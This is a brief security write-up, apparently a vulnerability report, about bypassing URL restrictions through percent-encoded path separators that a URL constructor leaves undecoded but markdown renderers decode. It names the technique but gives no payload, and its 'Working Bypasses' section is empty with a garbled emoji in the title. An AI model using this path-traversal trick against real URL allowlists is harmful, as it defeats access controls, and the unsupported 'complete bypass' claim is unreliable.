# ðŸš¨ CRITICAL: URL Encoding Bypasses - WORKING ATTACKS

## Root Cause: Encoder/Decoder Mismatch Vulnerability
The URL constructor doesn't decode percent-encoded path separators during normalization, but markdown parsers decode them during rendering, enabling path traversal bypasses.

## Working Bypasses:

### Forward Slash Encoding

## Impact: Complete URL Restriction Bypass
These allow accessing any URL by path traversal, completely defeating the security model.
